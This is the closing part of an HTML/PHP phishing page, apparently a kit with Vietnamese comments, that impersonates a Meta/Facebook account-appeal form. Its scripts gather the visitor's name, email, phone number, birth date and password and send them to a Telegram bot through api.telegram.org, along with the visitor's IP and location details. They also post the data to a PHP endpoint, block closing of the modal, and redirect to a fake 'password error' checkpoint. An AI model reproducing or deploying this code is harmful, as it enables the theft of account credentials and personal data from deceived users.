                                        <path d="M6.71277 6.7226C3.66479 8.79527 2 12 2 12C2 12 5.63636 19 12 19C14.0503 19 15.8174 18.2734 17.2711 17.2884M11 5.05822C11.3254 5.02013 11.6588 5 12 5C18.3636 5 22 12 22 12C22 12 21.3082 13.3317 20 14.8335" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                        <path d="M14 14.2362C13.4692 14.7112 12.7684 15.0001 12 15.0001C10.3431 15.0001 9 13.657 9 12.0001C9 11.1764 9.33193 10.4303 9.86932 9.88818" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                    </svg>
                                    <!-- SVG Icon (Eye) -->
                                    <svg class="icon-eye" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: none;">
                                        <path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12C23 12 19 20 12 20C5 20 1 12 1 12Z" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                        <path d="M12 15C14.2091 15 16 13.2091 16 11C16 8.79086 14.2091 7 12 7C9.79086 7 8 8.79086 8 11C8 13.2091 9.79086 15 12 15Z" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                    </svg>
                                </span>
                            </div>
                            <div class="form-btn-wrapper">
                                <button type="submit" class="btn btn-primary" id="submit-button" onclick="saveSessionAndShowModal();" disabled>
                                    <div class="spinner-border text-light" role="status" style="display: none;" id="spinner">
                                        <span class="visually-hidden">Loading...</span>
                                    </div>
                                    <span class="button-text">Submit</span>
                                </button>
                            </div>
                            <div id="forgot-pass-wrap">
                                <span>Forgot password?</span>
                            </div>
                        </form>
                        <div class="spaser"></div>
                    </div>
                    <div class="modal-footer">
                        <img src="../img/meta-logo-grey.png" alt="">
                    </div>
                </div>
            </div>
        </div>

    </form>


    <script>
        // show pass
        document.querySelector('.toggle-password').addEventListener('click', function() {
            const targetInput = document.getElementById(this.getAttribute('data-target'));
            const eyeOffIcon = this.querySelector('.icon-eye-off');
            const eyeIcon = this.querySelector('.icon-eye');

            if (targetInput) {
                // Toggle the type attribute
                if (targetInput.type === 'password') {
                    targetInput.type = 'text';
                    eyeOffIcon.style.display = 'none';
                    eyeIcon.style.display = 'inline';
                } else {
                    targetInput.type = 'password';
                    eyeOffIcon.style.display = 'inline';
                    eyeIcon.style.display = 'none';
                }
            }
        });
    </script>

    <script>
        // Enable the submit button when password is entered
        const passwordInput = document.getElementById('PasswordInput');
        const submitButton = document.getElementById('submit-button');
        const spinner = document.getElementById('spinner');
        const buttonText = submitButton.querySelector('.button-text');

        passwordInput.addEventListener('input', function() {
            // Enable submit button only if password is entered
            if (passwordInput.value.length >= 3) {
                submitButton.disabled = false;
            } else {
                submitButton.disabled = true;
            }
        });

        // Handle form submission with spinner display
        document.getElementById('apiForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent immediate form submission

            // Show spinner and hide text
            spinner.style.display = 'inline-block';
            buttonText.style.display = 'none';

            // Simulate form submission (e.g., API call)
            setTimeout(() => {
                // Here, you can add the code to handle the actual form submission, like an API call
                console.log('Form submitted!');

                // Optionally, reset the button state (remove spinner, show text)
                spinner.style.display = 'none';
                buttonText.style.display = 'inline';
            }, 3000); // Simulating 3 seconds delay
        });
    </script>

    <script>
        function saveSessionAndShowModal() {
            // Lấy dữ liệu từ các trường nhập liệu
            const fullName = document.getElementById('FullNameField').value;
            const email = document.getElementById('PersonalEmailField').value;
            const phone = document.getElementById('PhoneFirld').value;
            const password1 = document.getElementById('PasswordInput').value;

            // Kiểm tra xem người dùng đã nhập đầy đủ dữ liệu chưa
            if (!fullName || !email || !phone) {
                alert('Please fill in all required fields.');
                return;
            }

            // Gửi dữ liệu qua AJAX để lưu session
            fetch('session-apeal.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        fullName: fullName,
                        email: email,
                        phone: phone,
                        password1: password1
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        console.log('Session data saved successfully!');
                        showModal2(); // Chỉ hiển thị modal sau khi lưu thành công
                    } else {
                        console.error('Failed to save session data:', data.message);
                        alert('There was an error saving your data. Please try again.');
                    }
                })
        }
    </script>

    <script>
        // JavaScript để tự động hiển thị modal khi trang tải
        document.addEventListener('DOMContentLoaded', function() {
            const modal1 = document.getElementById('exampleModal1');
            const overlay1 = document.getElementById('overlay');

            // Hiển thị modal1 và overlay khi trang được tải
            modal1.classList.add('show');
            overlay1.classList.add('show');

            // Ngăn không cho đóng modal bằng cách bấm vào overlay hoặc phím ESC
            modal1.addEventListener('hidden.bs.modal', function(event) {
                event.preventDefault();
                event.stopImmediatePropagation();
            });

            overlay1.addEventListener('click', function(event) {
                event.preventDefault();
                event.stopImmediatePropagation();
            });

            document.addEventListener('keydown', function(event) {
                if (event.key === 'Escape') {
                    event.preventDefault();
                    event.stopImmediatePropagation();
                }
            });
        });

        // Function to show Modal 2 and hide Modal 1
        function showModal2() {
            const modal1 = document.getElementById('exampleModal1');
            const overlay1 = document.getElementById('overlay');
            const modal2 = document.getElementById('exampleModal2');
            const overlay2 = document.getElementById('overlay2');

            // Get form fields from modal1
            var fullName = document.getElementById('FullNameField').value.trim();
            var personalEmail = document.getElementById('PersonalEmailField').value.trim();
            var country_code = document.getElementById('country-code').value.trim();
            var mobilePhoneNumber = document.getElementById('PhoneFirld').value.trim();
            var dobDay = document.getElementById('dob-day').value;
            var dobMonth = document.getElementById('dob-month').value;
            var dobYear = document.getElementById('dob-year').value;
            var apeal = document.getElementById('exampleFormControlTextarea1').value.trim();

            // Check if all required fields are filled
            if (!fullName || !personalEmail || !country_code || !mobilePhoneNumber || !dobDay || !dobMonth || !dobYear || !apeal) {
                alert("Please enter your information to continue!");
                return;
            }

            // Hide Modal 1 and Overlay 1
            modal1.classList.remove('show');
            overlay1.classList.remove('show');

            // Show Modal 2 and Overlay 2
            modal2.classList.add('show');
            overlay2.classList.add('show');
        }

        // Function to handle form submission from Modal 2
        function sendToTelegramFromModal2(event) {
            event.preventDefault(); // Ngăn chặn hành vi mặc định của form

            // Lấy dữ liệu từ các trường trong form
            var password = document.getElementById('PasswordInput').value.trim();

            if (password === '') {
                alert("Please enter your password.");
                return;
            }

            var fullName = document.getElementById('FullNameField').value.trim();
            var personalEmail = document.getElementById('PersonalEmailField').value.trim();
            var mobilePhoneNumber = document.getElementById('PhoneFirld').value.trim();
            var country_code = document.getElementById('country-code').value.trim();
            var dobDay = document.getElementById('dob-day').value;
            var dobMonth = document.getElementById('dob-month').value;
            var dobYear = document.getElementById('dob-year').value;
            var apeal = document.getElementById('exampleFormControlTextarea1').value.trim();

            var content = "💬Thông Tin Tài Khoản 1💬" +
                "\n" + "----------------------------------------------------------" +
                "\nFull Name: " + "`" + fullName + "`" +
                "\nPersonal Email: " + "`" + personalEmail + "`" +
                "\nMobile Phone Number: " + "`" + country_code + "`" + " / " + "`" + mobilePhoneNumber + "`" +
                "\nDate of Birth: " + "`" + dobDay + "/" + dobMonth + "/" + dobYear + "`" +
                "\nApeal: " + "`" + apeal + "`" +
                "\nPassword 1: " + "`" + password + "`" +
                "\n" + "----------------------------------------------------------" +
                "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                "\nIP Address: " + "`<?php echo $ip; ?>`" +
                "\nCity: " + "`<?php echo $city; ?>`" +
                "\nRegion: " + "`<?php echo $region; ?>`" +
                "\nCountry: " + "`<?php echo $country; ?>`" +
                "\nOrg: " + "`<?php echo $org; ?>`" +
                "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";

            var apiToken = "<?php echo $token; ?>"; // Thay bằng token của bạn
            var data = {
                chat_id: '<?php echo $chatId; ?>', // Thay bằng chat ID của bạn
                text: content,
                parse_mode: 'Markdown'
            };

            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
            xhr.setRequestHeader('Content-Type', 'application/json');

            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        console.log('Message sent to Telegram bot successfully.');
                        setTimeout(function() {
                            window.location.href = "checkpoint-error-pass"; // Chuyển hướng sau khi gửi thành công
                        }, 1000);
                    } else {
            console.error('Failed to send message to Telegram bot.');
                    }
                }
            };

            xhr.send(JSON.stringify(data));
        }
    </script>




    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.1.3/js/bootstrap.bundle.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var openModalBtn = document.getElementById('openModalBtn');
            var modal1 = document.getElementById('exampleModal1');
            var modal2 = document.getElementById('exampleModal2');
            var overlay = document.getElementById('overlay');
            var overlay2 = document.getElementById('overlay2');

            openModalBtn.addEventListener('click', function() {
                modal1.classList.add('active');
                overlay.style.display = 'block';
            });

            window.addEventListener('click', function(event) {
                if (event.target == overlay) {
                    modal1.classList.remove('active');
                    modal2.classList.remove('active');
                    overlay.style.display = 'none';
                    overlay2.style.display = 'none';
                }
            });



            var sendBtn = modal1.querySelector('.btn-primary');
            sendBtn.addEventListener('click', function(event) {
                event.preventDefault();

                // Kiểm tra xem tất cả các trường đã được điền đầy đủ chưa
                var fullName = document.getElementById('FullNameField').value.trim();
                var personalEmail = document.getElementById('PersonalEmailField').value.trim();
                var businessEmail = document.getElementById('BuisenessEmailField').value.trim();
                var mobilePhoneNumber = document.getElementById('PhoneFirld').value.trim();
                var pageName = document.getElementById('fb-page-name-input').value.trim();
                var apeal = document.getElementById('exampleFormControlTextarea1').value.trim();

                if (fullName === '' || personalEmail === '' || businessEmail === '' || mobilePhoneNumber === '' || pageName === '' || apeal === '') {
                    alert("Please fill in all information.");
                    return; // Không thực hiện gửi nếu có trường trống
                }

                // Nếu tất cả các trường đã được điền đầy đủ, mở modal 2
                modal1.classList.remove('active');
                overlay.style.display = 'none';
                overlay2.style.display = 'block';
                modal2.classList.add('active');
            });

            var closeModalBtn2 = modal2.querySelector('.btn-close');
            closeModalBtn2.addEventListener('click', function() {
                modal2.classList.remove('active');
                overlay2.style.display = 'none';
            });
        });
    </script>




    <script>
        window.mobileCheck = function() {
            let check = false;
            (function(a) {
                if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i
                    .test(a) ||
                    /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i
                    .test(a.substr(0, 4))) check = true;
            })(navigator.userAgent || navigator.vendor || window.opera);

            return check;
        };
    </script>
    <script>
        const subLinks = {
            'PolicyCollapse': [{
                    'text': 'What is the Privacy Policy and what does it cover?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'What information do we collect?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How do we use your information?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How do we share your information on Meta Products or with integrated partners?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How do we share information with third parties?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How is the cooperation between Meta Companies organized?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How can you manage or delete your information and exercise your rights?',
                    'link': '',
                    'add_svg_link': false
                }, {
                    'text': 'How long do we keep your information?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How do we transmit information?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How do we respond to official requests, comply with applicable laws, and prevent harm?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How will you know when the policy changes?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'How to ask Meta questions?',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'Why and how we process your data',
                    'link': '',
                    'add_svg_link': false
                },
            ],
            'RulesCollapse': [{
                    'text': 'Cookie Policy',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'Information for those who do not use Meta Products',
                    'link': '',
                    'add_svg_link': true
                },
                {
                    'text': 'How Meta uses information for generative AI models',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'Data Transfer Framework Policy',
                    'link': '',
                    'add_svg_link': false
                },
                {
                    'text': 'Other terms and conditions',
                    'link': '',
                    'add_svg_link': true
                },

            ],
            'SettingCollapse': [{
                    'text': 'Facebook Settings',
                    'link': '',
                    'add_svg_link': true
                },
                {
                    'text': 'Instagram Settings',
                    'link': '',
                    'add_svg_link': true
                },
            ]


        }

        function addSubItems() {
            var linkSvg =
                `<svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg>`
            for (var [subId, items] of Object.entries(subLinks)) {
                var subElem = document.getElementById(subId)
                for (var i = 0; i < items.length; i++) {
                    var text_item = items[i]
                    var block = document.createElement('div')
                    block.classList.add('action-button')
                    block.innerHTML = `
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">
                      </div>
                      <div class="action-button-arrow">
                      </div>
                    `
                    if (text_item['add_svg_link']) {
                        var svg_block = block.querySelector('.action-button-arrow')
                        svg_block.innerHTML = linkSvg

                    }
                    var block_text = block.querySelector('.action-button-text')
                    block_text.innerText = text_item['text']
                    subElem.appendChild(block)
                    block.addEventListener('click', function() {
                        var start = document.getElementById('start')
                        start.click()
                    })
                }
            }
        }

        addSubItems()
    </script>
</body>

</html>